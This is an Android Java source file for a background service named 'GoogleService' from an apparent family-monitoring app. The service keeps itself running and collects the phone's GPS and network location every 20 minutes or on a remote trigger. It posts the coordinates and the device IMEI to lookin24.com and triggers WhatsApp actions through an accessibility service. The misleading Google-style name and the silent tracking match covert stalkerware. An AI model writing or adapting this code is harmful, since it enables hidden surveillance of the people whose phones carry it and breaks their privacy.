package com.family.background;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.family.accessibility.MyAccessibilityService;
import com.family.familyprotector.Device;
import com.family.familyprotector.LocationOnce;
import com.family.familyprotector.Logger;
import com.family.familyprotector.Not;
import com.family.internet.InternetHelper;
import com.family.internet.ServerHelper;
import com.family.internet.ServerHelper2;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;


public class GoogleService extends Service implements LocationListener {


    public static ArrayList<Location> locations = new ArrayList<>();

    boolean isGPSEnable = false;
    boolean isNetworkEnable = false;
    double latitude, longitude;
    LocationManager locationManager;
    Location location;
    private Handler mHandler = new Handler();
    private Timer mTimer = null;
    private Handler SecondHandler = new Handler();
    private Timer SecondTimer = null;

    public static boolean sendNow = false, sendWhatsapp = false;


    public GoogleService() { }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Logger.l("GoogleService Started");
        new Not(this);
        mTimer = new Timer();
        mTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                mHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        fn_getlocation(0L,0L);
                    }
                });
            }
        }, 0,  20*60 * 1000);

        SecondTimer = new Timer();
        SecondTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                SecondHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        if(sendNow) {
                            fn_getlocation(0L,0L);
                        }
                        if(sendWhatsapp && MyAccessibilityService.activities != null) {
                            MyAccessibilityService.sendWhatsapp();
                            sendWhatsapp = false;
                        }

                    }
                });
            }
        }, 0,  1 * 1000);
    }



    public void sendServer(ArrayList<Location> L) {
        final JSONObject data = new JSONObject();
        JSONArray ar = new JSONArray();
        for(Location x : L) {
            JSONObject jo = new JSONObject();
            try {
                jo.put("start", x.getTime() + "");
                jo.put("lo", x.getLongitude() + "");
                jo.put("la", x.getLatitude() + "");
                ar.put(jo);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        try {
            data.put("imei", new Device(this).getImei());
            data.put("data", ar);
        } catch (JSONException e) {
            e.printStackTrace();
        }



        //new ServerHelper2(this).execute("https://lookin24.com/sendLocation", data.toString());
        new AsyncTask<String, String, Void>() {
            @Override
            protected Void doInBackground(String... strings) {
                String ans = new InternetHelper().send("https://lookin24.com/sendLocation", data.toString());
                if(ans.equals("1")) {
                    if(locations.size() != 0) {
                        Location l = locations.get(locations.size()-1);
                        locations.clear();
                        locations.add(l);
                    }
                }
                return null;
            }
        }.execute();
    }
    @Override
    public void onLocationChanged(Location l) {
        Logger.l("LOCATIONN","Changed called" + l.getLatitude() + " - " + l.getLongitude());
        //new Not(this);
        if(sendNow) {
            sendNow = false;
        }
        locationManager.removeUpdates(this);
        if(locations.size() == 0) {
            locations.add(l);
        }else {
            Logger.l(l.distanceTo(locations.get(locations.size()-1)) + " uzunluq");
            if(l.distanceTo(locations.get(locations.size()-1)) >= 100) {
                locations.add(l);
            }else {
                locations.get(locations.size() - 1).setTime(System.currentTimeMillis());
            }
        }
        sendServer(locations);

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }


    private void fn_getlocation(Long mt, Long md) {
        if(locationManager != null) {
            locationManager.removeUpdates(this);
            locationManager = null;
            Logger.l("Location Manager Silindi");
        }
        locationManager = (LocationManager) getApplicationContext().getSystemService(LOCATION_SERVICE);
        isGPSEnable = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        isNetworkEnable = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);



        if (!isGPSEnable && !isNetworkEnable) {

        } else {

            if (isNetworkEnable) {
                location = null;
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

                    return;
                }
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, mt, md, this);
                if (locationManager!=null){
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (location!=null){
                        Logger.l("LOCATIONN", "last know from NEtwork" + location.getLatitude() + "- " + location.getLongitude());
                    }
                }

            }


            if (isGPSEnable){
                location = null;
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,mt, md,this);

                if (locationManager!=null){
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (location!=null){
                        Logger.l("LOCATIONN", "last know from GPS" + location.getLatitude() + "- " + location.getLongitude());
                    }
                }
            }


        }

    }








}
